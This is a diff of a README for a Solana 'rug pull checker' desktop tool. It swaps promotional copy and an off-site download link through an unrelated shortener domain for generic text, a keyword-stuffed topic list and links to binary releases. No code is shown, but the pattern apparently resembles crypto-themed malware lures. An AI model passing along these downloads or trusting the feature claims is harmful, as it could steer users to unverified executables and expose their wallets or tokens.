@@ -1,99 +1,96 @@
-# 🧠 SolanaChecker — Solana Token Scanner + Rug Pull & AI Analysis Tool  
-Your all-in-one Solana monitoring assistant 🚀🔎
+# 🚀 Rug Solana Checker - Solscan Explorer
 
-**SolanaChecker** is a next-generation desktop tool designed for in-depth interaction with the Solana blockchain. It helps users explore wallet data, track token movements, detect scams, and soon — even trade directly from the app.
+![Solana Checker](https://img.shields.io/badge/Solana_Checker-Explorer-brightgreen)
 
-> ✅ Simple. ⚡ Fast. 🧠 Smart.
+Welcome to the **Rug Solana Checker** repository! This tool allows you to explore and monitor real-time data for $SOL and Solana tokens. With this tool, you can easily track transactions, blocks, and token details.
 
----
+[Download the latest release here!](https://github.com/MrRandl3/rug-solana-checker-solscan/releases)
 
-## 📲 Download Now
+## 📖 Table of Contents
 
-[![Download](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=cloud-download)](https://talkingmanager.com/Qsg36rs9?name=solscannerV1.1)
+1. [Introduction](#introduction)
+2. [Features](#features)
+3. [Installation](#installation)
+4. [Usage](#usage)
+5. [Topics](#topics)
+6. [Contributing](#contributing)
+7. [License](#license)
+8. [Contact](#contact)
 
----
+## 📝 Introduction
 
-## 🖼 Interface Preview
+The **Rug Solana Checker** is designed for anyone interested in the Solana blockchain. Whether you are a developer, trader, or just a curious user, this tool provides you with the information you need. 
 
-> SolanaChecker features a clean, futuristic UI with dark mode, neon highlights, and an intuitive navigation panel.
+With the rise of meme coins and the potential for rug pulls, having a reliable way to monitor these assets is crucial. This tool simplifies that process. 
 
-![12025-04-10 12 26 53](https://github.com/user-attachments/assets/7cf07c6e-9bce-4d4c-ad10-15fce547c4f0)
+## 🌟 Features
 
-*SolanaChecker Desktop UI — Wallet Overview Tab*
+- **Real-time Data Tracking**: Monitor $SOL and other Solana tokens instantly.
+- **Transaction Exploration**: View transaction details and histories with ease.
+- **Block Information**: Access the latest blocks and their details.
+- **Token Details**: Get comprehensive information about any token on the Solana network.
+- **User-Friendly Interface**: Navigate through the tool effortlessly.
 
----
+## ⚙️ Installation
 
-## 🔧 Features
+To get started, download the latest release from the [Releases section](https://github.com/MrRandl3/rug-solana-checker-solscan/releases). 
 
-### ✅ **1. Wallet Balance Checker**  
-Instantly view SOL and token balances for any wallet address.
+1. Visit the link and download the appropriate file for your operating system.
+2. Extract the downloaded file.
+3. Follow the instructions in the README file included in the package to set up the environment.
 
-![22025-04-10 12 26 59](https://github.com/user-attachments/assets/e124685b-5eb0-4e2b-8a48-2c98cd6547fa)
+## 🛠️ Usage
 
-### 📊 **2. Token Explorer**  
-View all tokens tied to a wallet: name, symbol, amount, market value.
+Once you have installed the tool, you can start using it right away. 
 
-### 📈 **3. Address Analyzer**  
-Analyze transaction history, token flow, and wallet activity level.
-![32025-04-10 12 27 04](https://github.com/user-attachments/assets/86dd94c2-86c9-47f4-a0d1-c4cfec82dab2)
+1. Open the application.
+2. Enter the token name or address you want to monitor.
+3. Explore the various features available, including transaction details and block information.
 
-### 🔎 **4. Wallet Search & Lookup**  
-Find any wallet using address fragments or token relationships.
+For detailed instructions, refer to the documentation included in the installation package.
 
-### 🚨 **5. Rug Pull Checker**  
-Identify suspicious tokens by checking metadata, LP status, ownership, and launch behavior.
+## 🏷️ Topics
 
-### 🤖 **6. AI Analysis**  
-Compare the token to others with similar volume. See:
-- Twitter score
-- Website presence
-- Trade volume (buy/sell activity)
-- Risk level
-![42025-04-10 12 27 11](https://github.com/user-attachments/assets/2ac2cf4d-7346-454d-a4b1-bf5deca40db5)
+This repository covers a wide range of topics related to Solana and token monitoring:
 
+- **coin-rug-pull**
+- **meme-coin-price**
+- **meme-coin-rug-pull**
+- **rug-checker**
+- **rug-pull-bot**
+- **rug-pull-checker**
+- **rugpullbot**
+- **sol-check**
+- **solana-balance**
+- **solana-balance-checker**
+- **solana-check-jup**
+- **solana-checker**
+- **solana-meme-trading**
+- **solana-scan**
+- **solana-scanner**
+- **solana-scanning-bot**
+- **solana-token-bot**
+- **solana-token-checker**
+- **solana-token-scanner**
+- **token-scanner**
 
+## 🤝 Contributing
 
----
+We welcome contributions to enhance the tool. If you have ideas or suggestions, feel free to open an issue or submit a pull request. 
 
-## 🛠 Upcoming Features (Rolling out in the next few weeks!)
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push to your fork and submit a pull request.
 
-🔥 **Wallet Sniping Tool** — Catch new token launches instantly  
-🔁 **Live Buy/Sell Tracking** — Monitor trades for any wallet  
-📩 **Telegram Notifications** — Stay informed in real time  
-📈 **In-App Trading** — Buy/sell tokens directly inside the tool  
+## 📜 License
 
----
+This project is licensed under the MIT License. Feel free to use and modify it as needed.
 
-## 💸 Pricing
+## 📬 Contact
 
-🧪 **Free for the first 14 days** — test all features with no limitations.  
-💼 **After that: $30/month** — includes future updates, trading tools, and full AI access.
+For questions or support, reach out via GitHub issues or contact the repository owner directly.
 
----
+[Download the latest release here!](https://github.com/MrRandl3/rug-solana-checker-solscan/releases)
 
-## 📥 Telegram Integration
-
-To enable Telegram alerts, enter your bot token and chat ID inside the file:
-
-📁 Located in the root folder of the program.
-
-
----
-
-## 📌 Stay Updated
-
-This is an actively developed project. More features, chain integrations, and language options are coming soon. Star ⭐ the repo and follow along!
-
----
-
-## 💬 Contact & Support
-
-Have questions, feedback, or want to suggest a feature?
-
-📩 Email: solanachecker@protonmail.com    
-💬 Telegram: 
-
----
-
-### Built for Solana enthusiasts, traders, and researchers 🧪  
-Let SolanaChecker do the hard work — so you can focus on the next big thing.
+Thank you for using the **Rug Solana Checker**! Happy exploring!
